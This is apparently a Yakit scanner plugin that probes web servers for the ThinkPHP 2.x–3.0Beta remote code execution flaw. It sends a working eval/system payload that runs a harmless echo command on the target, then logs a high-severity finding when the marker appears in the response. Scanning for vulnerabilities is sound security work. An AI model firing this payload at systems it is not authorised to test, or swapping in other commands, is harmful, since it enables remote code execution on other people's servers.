# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port, payload){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet = `
GET {{params(payload)}} HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Cookie: PHPSESSID=71619624cc13f38412f7309d14ecfc6c
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0

`
    println(payload)
    rsp,req,_ = poc.HTTP(packet, 
    poc.params({"target":addr,"payload":payload}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
    // dump(rsp)
    if len(rsp) > 0 {
        println(string(rsp))
        if str.MatchAllOfSubString(rsp, `X-Confluence-Check: yakit`) && str.MatchAllOfSubString(rsp, "无法加载模块a"){
            yakit.Info("%v found ThinkPHP_2.x~3.0Beta远程代码执行漏洞", addr)
            risk.NewRisk(
            addr,risk.title("ThinkPHP_2.x~3.0Beta远程代码执行漏洞"),
            risk.severity("high"),
            risk.titleVerbose("ThinkPHP_2.x~3.0Beta远程代码执行漏洞存在"),
            risk.type("rce[ThinkPHP]"),
            risk.payload(`/?s=/a/b/c/${@eval($_GET[1])}&1=system(%27echo X-Confluence-Check: yakit%27);`),
        )
        }else{
            println("不存在ThinkPHP_2.x~3.0Beta远程代码执行漏洞")
            }
       
    }

    return
}
handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }
    payload = `/?s=/a/b/c/${@eval($_GET[1])}&1=system(%27echo%20X-Confluence-Check:%20yakit%27);`

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port, payload)
    }
    
}
